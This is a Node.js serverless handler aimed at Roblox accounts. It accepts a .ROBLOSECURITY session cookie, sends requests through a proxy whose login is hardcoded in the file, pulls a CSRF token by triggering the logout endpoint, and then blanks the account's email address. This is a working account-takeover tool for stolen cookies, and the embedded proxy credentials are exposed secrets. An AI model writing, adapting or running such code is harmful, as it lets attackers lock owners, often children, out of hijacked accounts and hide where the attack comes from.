const axios = require('axios');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    
    // Native Axios Proxy Config (Fixes the 407 error)
    const proxyConfig = {
        host: 'p.webshare.io',
        port: 80,
        auth: {
            username: 'zsotdpxo',
            password: 'l7za2lzgqish'
        }
    };

    const baseHeaders = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    try {
        // 1. Verify Cookie
        const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
            headers: baseHeaders, proxy: proxyConfig, timeout: 8000 
        });

        // 2. Get CSRF Token
        let csrfToken = '';
        try {
            await axios.post('https://auth.roblox.com/v2/logout', {}, { 
                headers: baseHeaders, proxy: proxyConfig, timeout: 8000 
            });
        } catch (err) {
            if (err.response && err.response.headers['x-csrf-token']) {
                csrfToken = err.response.headers['x-csrf-token'];
                baseHeaders['X-CSRF-TOKEN'] = csrfToken;
            } else {
                return res.status(400).json({ success: false, message: 'Failed to grab CSRF token.' });
            }
        }

        // 3. Wipe Email
        try {
            await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
                headers: baseHeaders, proxy: proxyConfig, timeout: 8000 
            });
            return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
        } catch (err) {
            if (err.response && err.response.status === 403) {
                return res.status(403).json({ success: false, message: "Blocked: Roblox requires the account password to remove the email." });
            }
            return res.status(500).json({ success: false, message: `Wipe failed: Status ${err.response ? err.response.status : err.message}` });
        }

    } catch (error) {
        if (error.response && error.response.status === 407) {
             return res.status(407).json({ success: false, message: 'Proxy Authentication Failed. Check Webshare credentials.' });
        }
        if (error.response && error.response.status === 401) {
            return res.status(401).json({ success: false, message: 'Cookie is invalid, expired, or proxy failed.' });
        }
        res.status(500).json({ success: false, message: `Network Error: ${error.message}` });
    }
}
